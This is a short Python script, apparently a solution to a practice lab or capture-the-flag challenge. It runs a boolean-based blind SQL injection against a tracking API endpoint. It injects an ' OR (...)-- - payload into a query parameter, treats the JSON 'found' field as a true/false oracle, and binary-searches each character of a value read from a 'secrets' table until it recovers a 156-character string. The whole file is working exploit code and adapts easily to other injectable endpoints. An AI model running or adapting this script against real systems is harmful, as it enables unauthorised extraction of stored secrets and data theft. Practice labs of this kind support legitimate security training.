import requests

URL = "https://mirage-l18.breachlab.org/api/track"

headers = {
    "Authorization": "Basic <ADD YOUR KEY>",
    "Cookie": "<ADD YOUR COOKIE>",
    "User-Agent": "Mozilla/5.0",
}

session = requests.Session()
session.headers.update(headers)


def oracle(condition):
    payload = f"' OR ({condition})-- -"

    r = session.get(
        URL,
        params={"code": payload},
        timeout=10
    )

    try:
        return r.json().get("found") is True
    except Exception:
        print("Unexpected response:", r.status_code, r.text[:200])
        return False


def get_char(position):
    low = 0
    high = 255

    while low < high:
        mid = (low + high) // 2

        condition = (
            f"unicode(substr("
            f"(SELECT value FROM secrets LIMIT 1),"
            f"{position},1"
            f"))>{mid}"
        )

        if oracle(condition):
            low = mid + 1
        else:
            high = mid

    return chr(low)


length = 156

result = ""

for position in range(1, length + 1):
    char = get_char(position)
    result += char

    print(f"[{position:03}] {char!r}  ->  {result}")

print("\nRecovered value:")
print(result)